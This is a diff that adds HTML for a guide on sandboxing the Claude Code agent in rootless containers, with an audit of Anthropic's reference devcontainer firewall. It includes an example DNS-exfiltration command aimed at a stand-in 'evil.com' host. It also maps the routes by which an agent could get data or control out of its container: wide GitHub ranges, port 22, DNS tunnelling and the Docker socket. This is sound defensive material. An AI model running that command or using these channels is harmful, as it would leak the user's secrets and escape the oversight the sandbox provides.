+          <div class="lbl">Subordinate IDs required</div>
+          <div class="txt">Rootless Podman maps container UID 0 to your host UID and UIDs 1+ into your <code>/etc/subuid</code> range <sup><a href="https://blog.nviso.eu/2026/02/03/rootless-containers-with-podman/">[12]</a></sup>; rootless Docker needs ≥65536 subordinate IDs for the daemon <sup><a href="https://docs.docker.com/engine/security/rootless/">[7]</a></sup>. A full escape lands you as <em>you</em>.</div>
+        </div>
+        <div class="inst amber">
+          <div class="big">0</div>
+          <div class="lbl">MAC walls under rootless Docker on Ubuntu</div>
+          <div class="txt">Mandatory access control is the second wall if seccomp is bypassed, and rootless Docker <b>cannot</b> use AppArmor <sup><a href="https://docs.docker.com/engine/security/rootless/">[7]</a></sup>. Podman labels processes <code>container_t</code> and applies the same confinement rootless as rootful <sup><a href="https://oneuptime.com/blog/post/2026-03-04-rootless-pods-selinux-confinement-rhel-9/view">[13]</a></sup> — a real differentiator on Fedora/RHEL.</div>
+        </div>
+        <div class="inst red">
+          <div class="big">3</div>
+          <div class="lbl">Qualys bypasses of Ubuntu's userns limits, 2025</div>
+          <div class="txt">The trade nobody advertises: rootless swaps daemon-root risk for a <em>larger</em> unprivileged-user-namespace attack surface, and userns CVEs kept landing through 2026 <sup><a href="https://www.kenmuse.com/blog/rootless-docker-and-its-hidden-security-trade-offs/">[8]</a></sup>. A 2026 comparative study of AI-code-sandbox engines puts runc/Docker at the largest attack surface and Firecracker at the lowest CVE velocity: "no single solution optimizes all security dimensions" <sup><a href="https://arxiv.org/pdf/2606.08433">[9]</a></sup>.</div>
+        </div>
+      </div>
+
+      <p style="font-size:.85rem;color:var(--dim);margin:1rem 0 0;max-width:78ch;">Practical reading: containers are a good blast-radius reducer against a <em>hostile repo</em>, not a boundary you'd bet on against a <em>targeted kernel exploit</em>. On a single-user workstation, "escape lands you as you" is a smaller win than it sounds — your home directory, SSH keys and <code>sudo</code> rights all belong to you. That's the VM's job.</p>
+    </section>
+
+    <!-- ============ ALARMS ============ -->
+    <section>
+      <div class="sec-hd">
+        <span class="num">03</span>
+        <h3>Alarm panel · Anthropic reference devcontainer</h3>
+        <span class="note">3 files: devcontainer.json · node:20 Dockerfile · init-firewall.sh</span>
+      </div>
+
+      <div class="panel" style="margin-bottom:1rem;">
+        <div class="panel-hd">
+          <span class="lamp alarm">4 active</span>
+          <span>Audited against <code>main</code></span>
+          <span style="margin-left:auto;"><span class="chip">anthropics/claude-code ⭐ 140k</span></span>
+        </div>
+        <div class="panel-bd">
+          <div class="alarm-grid">
+
+            <div class="alm">
+              <div>
+                <div class="alm-code">ALM-01 · DNS_ANY_RESOLVER</div>
+                <div class="alm-sev">Severity: critical</div>
+                <div style="margin-top:.5rem;"><span class="lamp alarm">closed: not planned</span></div>
+              </div>
+              <div class="alm-body">
+                <p><code>iptables -A OUTPUT -p udp --dport 53 -j ACCEPT</code> permits queries to <em>any</em> resolver, so <code>dig @attacker-dns $(base64 secret).evil.com</code> walks straight out of the default-deny firewall.</p>
+                <p style="color:var(--dimmer);">Filed with a repro and a one-line fix — restrict to <code>127.0.0.11</code> — and closed as not planned <sup><a href="https://github.com/anthropics/claude-code/issues/36907">[4]</a></sup>.</p>
+              </div>
+            </div>
+
+            <div class="alm">
+              <div>
+                <div class="alm-code">ALM-02 · ALLOWLIST_TOO_WIDE</div>
+                <div class="alm-sev">Severity: high</div>
+                <div style="margin-top:.5rem;"><span class="lamp alarm">fat write channel</span></div>
+              </div>
+              <div class="alm-body">
+                <p>The script ingests <code>.web</code>, <code>.api</code> and <code>.git</code> CIDR blocks from <code>api.github.com/meta</code> <sup><a href="https://github.com/anthropics/claude-code/blob/main/.devcontainer/init-firewall.sh">[3]</a></sup>. Those ranges serve gists, arbitrary repos and GitHub Pages — an agent with a token, or none at all via a public gist, has a write channel to the internet.</p>
+                <p style="color:var(--dimmer);">Port 22 is also unconditionally allowed, which is <code>git push</code> to anywhere.</p>
+              </div>
+            </div>
+
+            <div class="alm">
+              <div>
+                <div class="alm-code">ALM-03 · LAN_SLASH_24_ALLOWED</div>
+                <div class="alm-sev">Severity: high</div>
+                <div style="margin-top:.5rem;"><span class="lamp alarm">delete this line first</span></div>
+              </div>
+              <div class="alm-body">
+                <p><code>+ local /24</code> — the script allows the detected host network as a <code>/24</code> <sup><a href="https://github.com/anthropics/claude-code/blob/main/.devcontainer/init-firewall.sh">[3]</a></sup>.</p>
+                <p style="color:var(--dimmer);">On a homelab LAN that is your Proxmox API, your NAS, your router admin.</p>
+              </div>
+            </div>
+
+            <div class="alm med">
+              <div>
+                <div class="alm-code">ALM-04 · CAP_NET_ADMIN_IN_AGENT</div>
+                <div class="alm-sev">Severity: medium</div>
+                <div style="margin-top:.5rem;"><span class="lamp warn">shape, not breakage</span></div>
+              </div>
+              <div class="alm-body">
+                <p>The agent's container holds <code>CAP_NET_ADMIN</code> and <code>CAP_NET_RAW</code> <sup><a href="https://github.com/anthropics/claude-code/blob/main/.devcontainer/devcontainer.json">[14]</a></sup>. The non-root <code>node</code> user cannot use them — added capabilities land in the bounding set, not a non-root process's effective set — so this is defence-in-depth-shaped rather than broken.</p>
+                <p style="color:var(--dimmer);">But any root-in-container bug flushes the whole firewall. Better designs move <code>NET_ADMIN</code> out of the agent's container entirely <sup><a href="https://github.com/VirtusLab/sandcat">[5]</a></sup>.</p>
+              </div>
+            </div>
+
+          </div>
+        </div>
+      </div>
+
+      <div class="panel">
+        <div class="panel-hd"><span class="lamp ok">4 passing</span><span>What it gets right — worth copying</span></div>
+        <div class="panel-bd">
+          <div class="pass-grid">
+            <div class="pass"><b>Workspace-only bind mount</b><code>source=${localWorkspaceFolder},target=/workspace,type=bind</code> — the host home is not mounted <sup><a href="https://github.com/anthropics/claude-code/blob/main/.devcontainer/devcontainer.json">[14]</a></sup>.</div>
+            <div class="pass"><b>Credentials in named volumes</b><code>~/.claude</code> and shell history live in per-devcontainer volumes keyed on <code>${devcontainerId}</code>, with <code>CLAUDE_CONFIG_DIR</code> set so <code>.claude.json</code> lands inside too <sup><a href="https://code.claude.com/docs/en/devcontainer">[2]</a></sup>.</div>
+            <div class="pass"><b>One-line sudo grant</b><code>node ALL=(root) NOPASSWD: /usr/local/bin/init-firewall.sh</code> and nothing else <sup><a href="https://github.com/anthropics/claude-code/blob/main/.devcontainer/Dockerfile">[15]</a></sup>. No general <code>sudo</code>, no writable escalation path.</div>
+            <div class="pass"><b>Default-deny plus a self-test</b>DROP on <code>OUTPUT</code>/<code>INPUT</code>/<code>FORWARD</code> with an <code>ipset</code> allowlist, and an assertion that <code>example.com</code> fails while <code>api.github.com/zen</code> succeeds <sup><a href="https://github.com/anthropics/claude-code/blob/main/.devcontainer/init-firewall.sh">[3]</a></sup>.</div>
+          </div>
+        </div>
+      </div>
+    </section>
+
+    <!-- ============ EGRESS ROUTING ============ -->
+    <section>
+      <div class="sec-hd">
+        <span class="num">04</span>
+        <h3>Egress routing · three architectures</h3>
+        <span class="note">worst → best</span>
+      </div>
+
+      <div class="lane worst">
+        <div class="lane-rank">3</div>
+        <div>
+          <div class="lane-title">In-container <code>iptables</code> + <code>NET_ADMIN</code> — the Anthropic pattern</div>
+          <div class="flow">
+            <span class="node agent">agent + firewall</span><span class="arrow">→</span>
+            <span class="node net">host bridge</span><span class="arrow">→</span>
+            <span class="node net">internet</span>
+            <span class="arrow bad">⤷</span><span class="node leak">UDP/53 any resolver</span>
+          </div>
+          <p class="lane-note">IP-level only, so it cannot distinguish <code>api.anthropic.com</code> from any other host behind the same CDN IP, cannot see DNS, and the enforcement lives <em>inside the thing being contained</em>. It also barely works rootless: <code>iptables</code> in a rootless container needs both <code>NET_ADMIN</code> and <code>NET_RAW</code>, <em>and</em> the <code>ip_tables</code>/<code>xt_*</code> modules must already be loaded on the host, because module loading needs real root <sup><a href="https://www.procustodibus.com/blog/2022/10/wireguard-in-podman/">[16]</a></sup> <sup><a href="https://github.com/containers/podman/issues/12661">[17]</a></sup>.</p>
+        </div>
+      </div>
+
+      <div class="lane">
+        <div class="lane-rank">2</div>
+        <div>
+          <div class="lane-title"><code>HTTPS_PROXY</code> pointed at a filtering proxy</div>
+          <div class="flow">
+            <span class="node agent">agent</span><span class="arrow">→</span>
+            <span class="node gate">filtering proxy</span><span class="arrow">→</span>
+            <span class="node net">internet</span>
+            <span class="arrow bad">⤷</span><span class="node leak">anything ignoring the env var</span>
+          </div>
+          <p class="lane-note">Hostname-aware and loggable, but opt-in: anything that ignores the environment variable goes direct. Claude Code honours <code>HTTPS_PROXY</code>/<code>NO_PROXY</code> and <code>NODE_EXTRA_CA_CERTS</code>, but <b>not</b> SOCKS <sup><a href="https://code.claude.com/docs/en/network-config">[21]</a></sup> — which is exactly what a MITM proxy needs.</p>
+        </div>
+      </div>
+
+      <div class="lane best">
+        <div class="lane-rank">1</div>
+        <div>
+          <div class="lane-title">Isolated network, proxy as the only exit <span class="lamp ok" style="margin-left:.4rem;">selected</span></div>
+          <div class="flow">
+            <span class="node agent">agent</span><span class="arrow">→</span>
+            <span class="node net">--internal net · no gateway</span><span class="arrow">→</span>
+            <span class="node gate">proxy + allowlist DNS</span><span class="arrow">→</span>
+            <span class="node net">internet</span>
+          </div>
+          <p class="lane-note">Compose's <code>internal: true</code> "lets you create an externally isolated network" <sup><a href="https://docs.docker.com/reference/compose-file/networks/">[22]</a></sup>; Podman's <code>--internal</code> "restricts external access of this network" <sup><a href="https://docs.podman.io/en/latest/markdown/podman-network-create.1.html">[24]</a></sup>. The agent container has <em>no route off the box</em>, so the proxy is not a suggestion. <code>--network=none</code> is strictly worse — with no interface at all the agent cannot reach the proxy either.</p>
+        </div>
+      </div>
+
+      <div class="panel" style="border-color:#5a4118;">
+        <div class="panel-hd" style="background:var(--warn-d);"><span class="lamp warn">Residual leak</span><span>One gap survives even architecture 1 — on Docker</span></div>
+        <div class="panel-bd">
+          <p style="margin:0;font-size:.85rem;color:var(--txt);">The embedded resolver at <code>127.0.0.11</code> forwards names it cannot answer to the <em>host's</em> upstream resolvers <sup><a href="https://oneuptime.com/blog/post/2026-02-08-how-to-use-docker-embedded-dns-server/view">[23]</a></sup>, so DNS tunnelling still exits an <code>internal: true</code> network. Fix it by pointing the container at your own resolver via <code>dns:</code> and having that resolver answer only allowlisted names — non-permitted domains resolve to a placeholder IP <sup><a href="https://github.com/agentcage/agentcage">[34]</a></sup>. Podman sidesteps it: <code>--internal</code> disables the DNS plugin outright, so you must supply <code>--dns</code> explicitly <sup><a href="https://docs.podman.io/en/latest/markdown/podman-network-create.1.html">[24]</a></sup>.</p>
+        </div>
+      </div>
+    </section>
+
+    <!-- ============ ALLOWLIST ============ -->
+    <section>
+      <div class="sec-hd">
+        <span class="num">05</span>
+        <h3>Allowlist readout</h3>
+        <span class="note">what Claude Code actually needs — and what it does not</span>
+      </div>
+      <div class="panel">
+        <div class="panel-hd"><span>Rule table · default policy DENY</span><span style="margin-left:auto;"><span class="chip">source [21]</span></span></div>
+        <div class="panel-bd" style="padding:0;">
+          <div class="tscroll">
+            <table class="rules">
+              <thead>
+                <tr><th>Channel</th><th>Hosts</th><th>Verdict</th></tr>
+              </thead>
+              <tbody>
+                <tr><td>Inference + WebFetch preflight</td><td class="host">api.anthropic.com</td><td><span class="lamp ok">allow</span></td></tr>
+                <tr><td>Sign-in / OAuth refresh</td><td class="host">claude.ai · claude.com · platform.claude.com</td><td><span class="lamp ok">allow</span></td></tr>
+                <tr><td>Updates, plugins</td><td class="host">downloads.claude.ai · storage.googleapis.com · registry.npmjs.org</td><td><span class="lamp ok">allow</span></td></tr>
+                <tr><td>Docs, release notes</td><td class="host">code.claude.com · raw.githubusercontent.com</td><td><span class="lamp ok">allow</span></td></tr>
+                <tr><td class="drop">Optional / droppable</td><td class="host drop">mcp-proxy.anthropic.com · bridge.claudeusercontent.com · http-intake.logs.us5.datadoghq.com · browser-intake-us5-datadoghq.com · formulae.brew.sh</td><td><span class="lamp warn">drop</span></td></tr>
+                <tr class="deny"><td>Your git workflow</td><td class="host">github.com</td><td><span class="lamp alarm">not required</span></td></tr>
+              </tbody>
+            </table>
+          </div>
+        </div>
+      </div>
+      <p style="font-size:.85rem;color:var(--dim);margin:.9rem 0 0;max-width:78ch;">Set <code>CLAUDE_CODE_DISABLE_NONESSENTIAL_TRAFFIC=1</code> and <code>DISABLE_AUTOUPDATER=1</code> in <code>containerEnv</code> and the droppable row mostly disappears <sup><a href="https://code.claude.com/docs/en/devcontainer">[2]</a></sup>. Note that nothing in the required list is <code>github.com</code> — that's for <em>your</em> git workflow, and it's the exfil channel.</p>
+    </section>
+
+    <!-- ============ UID TRAP ============ -->
+    <section>
+      <div class="sec-hd">
+        <span class="num">06</span>
+        <h3>Mount plane · the rootless UID trap</h3>
+        <span class="note">mount the repo, nothing else</span>
+      </div>
+
+      <div class="instruments" style="margin-bottom:1rem;">
+        <div class="inst red">
+          <div class="big">✗</div>
+          <div class="lbl">Rootless Docker + skip-permissions + writable repo</div>
+          <div class="txt">Rootless Docker maps your host UID to container UID 0, so host files you own appear <em>root-owned</em> inside and a non-root container user cannot write them <sup><a href="https://github.com/moby/moby/issues/45919">[18]</a></sup>. The obvious fix — run as container root — collides head-on with Claude Code: "The CLI rejects this flag when launched as root" <sup><a href="https://code.claude.com/docs/en/devcontainer">[2]</a></sup>. An actual dead end without <code>chown</code> gymnastics.</div>
+        </div>
+        <div class="inst">
+          <div class="big">✓</div>
+          <div class="lbl">Podman solves it declaratively</div>
+          <div class="txt"><code>--userns=keep-id</code> maps your host UID/GID straight through, so container <code>node</code> <em>is</em> host you and bind-mount ownership just works <sup><a href="https://oneuptime.com/blog/post/2026-03-17-use-userns-keep-id-option-podman/view">[19]</a></sup> <sup><a href="https://seandheath.com/posts/vscode-dev-containers-with-rootless-podman/">[20]</a></sup>. For volumes already owned wrong: <code>podman unshare chown -R 1000:1000 ./vol</code>.</div>
+        </div>
+        <div class="inst amber">
+          <div class="big">:z</div>
+          <div class="lbl">SELinux label, or EACCES</div>
+          <div class="txt">On SELinux hosts a bind mount needs a label: <code>:z</code> (shared, multiple containers) or <code>:Z</code> (private, exclusive). Use <code>:z</code> for a repo you also open in a host editor. Drop <code>label=disable</code> and keep the confinement — which you want.</div>
+        </div>
+      </div>
+
+      <div class="term">
+        <div class="term-hd"><span class="dot"></span><span>.devcontainer/devcontainer.json — rootless Podman</span></div>
+        <pre><span class="k">"runArgs"</span>: [<span class="s">"--userns=keep-id:uid=1000,gid=1000"</span>, <span class="s">"--security-opt=label=disable"</span>],
+<span class="k">"containerUser"</span>: <span class="s">"node"</span>,
+<span class="k">"updateRemoteUserUID"</span>: <span class="good">true</span></pre>
+      </div>
+
+      <p style="font-size:.85rem;color:var(--dim);margin:.9rem 0 0;max-width:78ch;">Not <code>$HOME</code>, not <code>~/.ssh</code>, not <code>~/.aws</code> — Anthropic's own guidance is to prefer repository-scoped or short-lived tokens over mounting host secret files <sup><a href="https://code.claude.com/docs/en/devcontainer">[2]</a></sup>.</p>
+    </section>
+
+    <!-- ============ CREDENTIALS ============ -->
+    <section>
+      <div class="sec-hd">
+        <span class="num">07</span>
+        <h3>Credential plane</h3>
+        <span class="note">the host keyring is never mounted</span>
+      </div>
+      <div class="log">
+        <div class="log-row"><span class="log-tag dim">DEFAULT</span><span class="log-txt"><b><code>~/.claude</code> in a named volume</b> with <code>CLAUDE_CONFIG_DIR</code> pointing at it, keyed on <code>${devcontainerId}</code> so repos don't share one token store <sup><a href="https://code.claude.com/docs/en/devcontainer">[2]</a></sup>.</span></div>
+        <div class="log-row"><span class="log-tag dim">PREFER</span><span class="log-txt"><b>Proxy-side injection over env-var tokens.</b> <a class="inline" href="https://github.com/VirtusLab/sandcat">sandcat</a> and <a class="inline" href="https://github.com/mattolson/agent-sandbox">agent-sandbox</a> keep real secrets in the proxy container and give the agent placeholders <sup><a href="https://github.com/VirtusLab/sandcat">[5]</a></sup> <sup><a href="https://github.com/mattolson/agent-sandbox">[25]</a></sup>. A stolen <code>~/.claude</code> token is annoying; a stolen broad-scope GitHub PAT is a supply-chain incident.</span></div>
+        <div class="log-row"><span class="log-tag">ALARM</span><span class="log-txt"><b>Turn off VS Code's git credential sharing.</b> Dev Containers copies your host <code>.gitconfig</code> in, reuses your host credential helper — "credentials you've entered locally will be reused in the container" — and <b>forwards your host SSH agent</b> automatically <sup><a href="https://code.visualstudio.com/remote/advancedcontainers/sharing-git-credentials">[28]</a></sup>. That convenience hands an unattended agent your push rights to everything.</span></div>
+        <div class="log-row"><span class="log-tag dim">FIX</span><span class="log-txt">Set git identity via <code>containerEnv</code> (<code>GIT_AUTHOR_NAME</code>, <code>GIT_AUTHOR_EMAIL</code>, <code>GIT_COMMITTER_*</code>), let the agent commit but never push, and push from the host yourself.</span></div>
+      </div>
+    </section>
+
+    <!-- ============ INTERLOCK ============ -->
+    <section>
+      <div class="sec-hd">
+        <span class="num">08</span>
+        <h3>Interlock · Docker socket</h3>
+        <span class="note">do not open</span>
+      </div>
+      <div class="interlock">
+        <div class="hd"><span class="sign">⊠</span> Bind-mounting <code>/var/run/docker.sock</code> is host root by another name.</div>
+        <p>The container can just start a <code>--privileged</code> sibling <sup><a href="https://book.hacktricks.wiki/en/linux-hardening/privilege-escalation/docker-security/abusing-docker-socket-for-privilege-escalation.html">[26]</a></sup>. It defeats every other control on this page, and it is <em>not</em> redeemed by rootless mode: rootless just makes the socket equal to your user rather than root, which on a workstation is the account that matters.</p>
+        <p>Even purpose-built guards leak. CVE-2026-6406 bypassed Docker Desktop's Enhanced Container Isolation because <code>--use-api-socket</code> mounts the socket via <code>HostConfig.Mounts</code> while the policy check only inspected <code>HostConfig.Binds</code> <sup><a href="https://www.sentinelone.com/vulnerability-database/cve-2026-6406/">[27]</a></sup>.</p>
+        <p>If the agent needs to build images: rootless Podman <em>inside</em> the container, or a separate builder it talks to over a proxied API. Never the outer socket.</p>
+      </div>
+    </section>
+
+    <!-- ============ WIRING ============ -->
+    <section>
+      <div class="sec-hd">
+        <span class="num">09</span>
+        <h3>Recommended wiring</h3>
+        <span class="note">rootless Podman · agent on an internal network · <code>NET_ADMIN</code> nowhere near the agent</span>
+      </div>
+
+      <div class="term" style="margin-bottom:.7rem;">
+        <div class="term-hd"><span class="dot"></span><span>host · one-time prerequisites</span></div>
+        <pre><span class="c"># rootless Podman prerequisites</span>
+sudo apt install podman podman-compose uidmap slirp4netns
+grep <span class="s">"$USER"</span> /etc/subuid /etc/subgid   <span class="c"># must exist, &gt;=65536 IDs</span>
+systemctl --user enable --now podman.socket
+podman network create --internal --disable-dns agent-net
+podman network create egress-net</pre>
+      </div>
+
+      <div class="term" style="margin-bottom:.7rem;">
+        <div class="term-hd"><span class="dot"></span><span>compose.yaml</span></div>
+        <pre><span class="k">services:</span>
+  <span class="k">proxy:</span>
+    build: ./proxy                 <span class="c"># mitmproxy + allowlist addon + dnsmasq</span>
+    networks: [agent-net, egress-net]
+    volumes:
+      - ./allowlist.yaml:/etc/proxy/allowlist.yaml:ro,z
+      - ~/.config/agent/secrets:/secrets:ro,z   <span class="c"># secrets live HERE, not in the agent</span>
+      - proxy-ca:/ca
+
+  <span class="k">agent:</span>
+    build: .
+    networks: [agent-net]          <span class="good"># no route off the host</span>
+    dns: [10.89.1.2]               <span class="good"># the proxy's dnsmasq; allowlist-only answers</span>
+    userns_mode: <span class="s">"keep-id:uid=1000,gid=1000"</span>
+    cap_drop: [ALL]
+    security_opt: [no-new-privileges]
+    environment:
+      HTTPS_PROXY: http://proxy:8080
+      HTTP_PROXY: http://proxy:8080
+      NO_PROXY: localhost,127.0.0.1
+      NODE_EXTRA_CA_CERTS: /ca/mitmproxy-ca-cert.pem
+      CLAUDE_CONFIG_DIR: /home/node/.claude
+      CLAUDE_CODE_DISABLE_NONESSENTIAL_TRAFFIC: <span class="s">"1"</span>
+      DISABLE_AUTOUPDATER: <span class="s">"1"</span>
+      GIT_AUTHOR_NAME: <span class="s">"Wouter (agent)"</span>
+      GIT_AUTHOR_EMAIL: <span class="s">"agent@localhost"</span>
+    volumes:
+      - ./:/workspace:z            <span class="good"># the repo, and nothing else</span>
+      - claude-config:/home/node/.claude
+      - proxy-ca:/ca:ro
+    working_dir: /workspace
+    command: [<span class="s">"claude"</span>, <span class="s">"--dangerously-skip-permissions"</span>]
+
+<span class="k">networks:</span>
+  agent-net:  { external: true }
+  egress-net: { external: true }
+
+<span class="k">volumes:</span>
+  claude-config:
+  proxy-ca:</pre>
+      </div>
+
+      <div class="term">
+        <div class="term-hd"><span class="dot"></span><span>Dockerfile — no iptables, no ipset, no sudo</span></div>
+        <pre><span class="k">FROM</span> node:22-bookworm-slim
+<span class="k">RUN</span> apt-get update &amp;&amp; apt-get install -y --no-install-recommends \
+      git ripgrep ca-certificates &amp;&amp; rm -rf /var/lib/apt/lists/*
+<span class="k">RUN</span> npm install -g @anthropic-ai/claude-code@2.1.220   <span class="c"># pin; auto-update is off</span>
+<span class="k">RUN</span> mkdir -p /etc/claude-code
+<span class="k">COPY</span> managed-settings.json /etc/claude-code/managed-settings.json
+<span class="k">USER</span> node</pre>
+      </div>
+
+      <p style="font-size:.85rem;color:var(--dim);margin:.9rem 0 0;max-width:78ch;"><code>managed-settings.json</code> at <code>/etc/claude-code/managed-settings.json</code> is read at the highest precedence in the settings hierarchy, above anything the repo's <code>.claude/</code> can set <sup><a href="https://code.claude.com/docs/en/devcontainer">[2]</a></sup> — the right place to pin deny rules a hostile repo must not be able to widen, which is exactly the class of bug CVE-2025-59536 was <sup><a href="https://thehackernews.com/2026/02/claude-code-flaws-allow-remote-code.html">[29]</a></sup>. Want editor integration? Wrap the same container in <code>devcontainer.json</code> with an <code>initializeCommand</code> creating the networks plus the <code>runArgs</code> above, and drive it headless with <code>devcontainer up --workspace-folder .</code> when you don't want the IDE's management channel in the picture <sup><a href="https://github.com/devcontainers/cli">[32]</a></sup>.</p>
+    </section>
+
+    <!-- ============ IMPLEMENTATIONS ============ -->
+    <section>
+      <div class="sec-hd">
+        <span class="num">10</span>
+        <h3>Reference implementations · copy, don't reinvent</h3>
+        <span class="note">all three put the firewall outside the agent</span>
+      </div>
+      <div class="impl">
+
+        <div class="impl-card">
+          <img src="dashboard/images/sandcat.webp" alt="VirtusLab/sandcat repository card">
+          <div class="impl-bd">
+            <div class="impl-name"><a href="https://github.com/VirtusLab/sandcat">sandcat</a><span class="impl-stars">⭐ 171 · Jul 2026</span></div>
+            <p class="impl-txt">Devcontainer + compose. mitmproxy in WireGuard mode; a <code>wg-client</code> sidecar holds <code>NET_ADMIN</code> and the agent container <b>shares its network namespace</b>, inheriting the tunnel with no capabilities of its own. Rules are first-match-wins deny-by-default, DNS is evaluated against the same ruleset <sup><a href="https://github.com/VirtusLab/sandcat">[5]</a></sup>.</p>
+            <div class="impl-steal">↳ steal: <code>SANDCAT_PLACEHOLDER_*</code> env vars the proxy substitutes for allowed hosts only.</div>
+          </div>
+        </div>
+
+        <div class="impl-card">
+          <img src="dashboard/images/agentcage.webp" alt="agentcage/agentcage repository card">
+          <div class="impl-bd">
+            <div class="impl-name"><a href="https://agentcage.ai/">agentcage</a><span class="impl-stars">⭐ 21 · Jul 2026</span></div>
+            <p class="impl-txt">Rootless Podman <code>--internal</code> network with no gateway, plus dnsmasq and transparent-mitmproxy sidecars. MIT, fail-closed <sup><a href="https://agentcage.ai/">[6]</a></sup>.</p>
+            <div class="impl-steal">↳ steal: inspector chain over requests, WebSocket frames <em>and</em> DNS queries; denied domains resolve to a placeholder IP <sup><a href="https://github.com/agentcage/agentcage">[34]</a></sup>.</div>
+          </div>
+        </div>
+
+        <div class="impl-card">
+          <img src="dashboard/images/agent-sandbox.webp" alt="mattolson/agent-sandbox repository card">
+          <div class="impl-bd">
+            <div class="impl-name"><a href="https://github.com/mattolson/agent-sandbox">agent-sandbox</a><span class="impl-stars">⭐ 194 · Jul 2026</span></div>
+            <p class="impl-txt">Same two-layer idea: mitmproxy sidecar plus in-container <code>iptables</code> so only the proxy is reachable, with secrets mounted into the proxy alone <sup><a href="https://github.com/mattolson/agent-sandbox">[25]</a></sup>.</p>
+            <div class="impl-steal">↳ steal the warning: the IDE's devcontainer management channel is a control plane <em>outside</em> the firewall, and a broad PAT reaches every repo the account can.</div>
+          </div>
+        </div>
+
+      </div>
+    </section>
+
+    <!-- ============ FRICTION ============ -->
+    <section>
+      <div class="sec-hd">
+        <span class="num">11</span>
+        <h3>Friction log · honestly</h3>
+        <span class="note">what you pay, day to day</span>
+      </div>
+      <div class="log">
+        <div class="log-row"><span class="log-tag">REBUILD</span><span class="log-txt"><b>Pin the Claude Code version</b> and install it in a layer above <code>apt</code> so a toolchain change doesn't re-download it. The Dev Container Feature always pulls latest, which is why the Dockerfile uses <code>npm install -g …@X.Y.Z</code> <sup><a href="https://code.claude.com/docs/en/devcontainer">[2]</a></sup>.</span></div>
+        <div class="log-row"><span class="log-tag">PORTS</span><span class="log-txt"><b>An internal network publishes nothing.</b> Attach a second publishing network to the agent <em>only</em> while you're actively testing, or reverse-proxy through the sidecar. Rootless engines also can't bind host ports below 1024 without <code>CAP_NET_BIND_SERVICE</code> on the rootlesskit binary or <code>net.ipv4.ip_unprivileged_port_start=0</code> <sup><a href="https://docs.docker.com/engine/security/rootless/">[7]</a></sup>.</span></div>
+        <div class="log-row"><span class="log-tag">LIMITS</span><span class="log-txt"><b>Rootless Docker honours <code>--cpus</code>/<code>--memory</code> only on cgroup v2 + systemd</b> <sup><a href="https://docs.docker.com/engine/security/rootless/">[7]</a></sup>. Worth checking before you let an agent run a build loop unattended.</span></div>
+        <div class="log-row"><span class="log-tag">NESTED</span><span class="log-txt"><b>Layering Claude Code's own bubblewrap sandbox inside the container needs a nested-sandbox setting</b>, because default seccomp blocks <code>unshare</code> <sup><a href="https://code.claude.com/docs/en/sandbox-environments">[1]</a></sup> <sup><a href="https://docs.docker.com/engine/security/seccomp/">[10]</a></sup>.</span></div>
+        <div class="log-row"><span class="log-tag dim">GIT</span><span class="log-txt">Identity via <code>containerEnv</code>, commits inside, pushes from the host.</span></div>
+      </div>
+    </section>
+
+    <!-- ============ RESIDUAL ============ -->
+    <section>
+      <div class="sec-hd">
+        <span class="num">12</span>
+        <h3>Residual risk · what none of this stops</h3>
+        <span class="note">escalation path</span>
+      </div>
+
+      <div class="panel" style="margin-bottom:1rem;">
+        <div class="panel-bd">
+          <p style="margin:0;font-size:.9rem;color:var(--txt);max-width:80ch;">The workspace is writable, so anything Claude can read in <code>/workspace</code> it can also send to any allowlisted host — and it can rewrite your code <sup><a href="https://code.claude.com/docs/en/sandbox-environments">[1]</a></sup>. Isolation also doesn't change what goes to the model.</p>
+        </div>
+      </div>
+
+      <div class="panel" style="border-color:#5a4118;">
+        <div class="panel-hd" style="background:var(--warn-d);"><span class="lamp warn">Escalate</span><span>For a repo you actually distrust</span></div>
+        <div class="panel-bd">
+          <div class="escalate">
+            <div class="mark"><img src="dashboard/images/proxmox.webp" alt="Proxmox logo"></div>
+            <div>
+              <p style="margin:0 0 .5rem;font-size:.9rem;color:var(--txt);">The practitioner and vendor answers converge: <b>a separate kernel</b> — a Proxmox VM, a microVM, or Docker Desktop's sandboxes feature <sup><a href="https://docs.docker.com/ai/sandboxes/">[33]</a></sup> <sup><a href="https://news.ycombinator.com/item?id=47545715">[30]</a></sup> — with the container pattern above running <em>inside</em> it.</p>
+              <p style="margin:0;font-size:.8rem;color:var(--dimmer);">Two boundaries, not one. <a class="inline" href="../../proxmox-as-the-isolation-boundary/">Proxmox as the isolation boundary →</a></p>
+            </div>
+          </div>
+        </div>
+      </div>
+    </section>
+
+    <!-- ============ ADJACENT ============ -->
+    <section>
+      <div class="sec-hd">
+        <span class="num">13</span>
+        <h3>Adjacent consoles</h3>
+        <span class="note"><a class="inline" href="../../">Running Claude Code safely on a Linux workstation</a></span>
+      </div>
+      <div class="sibs">
+        <a class="sib" href="../../threat-model-and-blast-radius-for-an-agentic-coding-cli/">
+          <span class="d">survey</span>
+          <div class="t">Threat model and blast radius for an agentic coding CLI</div>
+          <div class="s">Realized 2026 losses came from the agent's own destructive git commands and from supply-chain malware weaponizing an installed agent CLI — not the exotic prompt-injection scenarios.</div>
+        </a>
+        <a class="sib" href="../../claude-code-native-guardrails-and-permission-model/">
+          <span class="d">expedition</span>
+          <div class="t">Claude Code's native guardrails, and where they stop</div>
+          <div class="s">The permission model is an in-process policy layer, not a security boundary; only the bubblewrap-backed Bash sandbox has OS teeth, and it covers Bash alone.</div>
+        </a>
+        <a class="sib" href="../../linux-native-sandboxing-on-the-workstation/">
+          <span class="d">expedition</span>
+          <div class="t">Linux-native sandboxing on the workstation itself</div>
+          <div class="s">Turn on the built-in bubblewrap sandbox, then wrap the whole process in a 30-line bwrap script; firejail and Flatpak are the wrong tools here.</div>
+        </a>
+        <a class="sib" href="../../proxmox-as-the-isolation-boundary/">
+          <span class="d">expedition</span>
+          <div class="t">Proxmox as the isolation boundary: KVM VM, not LXC</div>
+          <div class="s">Containers share the host kernel and privileged LXC cannot be root-safe — plus wiring, firewall rules, snapshot policy and sizing for a dedicated agent guest.</div>
+        </a>
+        <a class="sib" href="../../credential-and-secret-isolation/">
+          <span class="d">survey</span>
+          <div class="t">Credential isolation for an agentic coding CLI</div>
+          <div class="s">An agent that can read <code>$HOME</code> holds your whole identity, and on Linux the keyring does not help.</div>
+        </a>
+        <a class="sib" href="../../audit-trail-and-recovery-drills/">
+          <span class="d">recon</span>
+          <div class="t">Audit trail and recovery drills</div>
+          <div class="s">Git commits are your real undo and a PostToolUse hook is your real audit log; transcripts and /rewind are convenience layers.</div>
+        </a>
+      </div>
+    </section>
+
+    <!-- ============ SOURCES ============ -->
+    <section>
+      <div class="sec-hd">
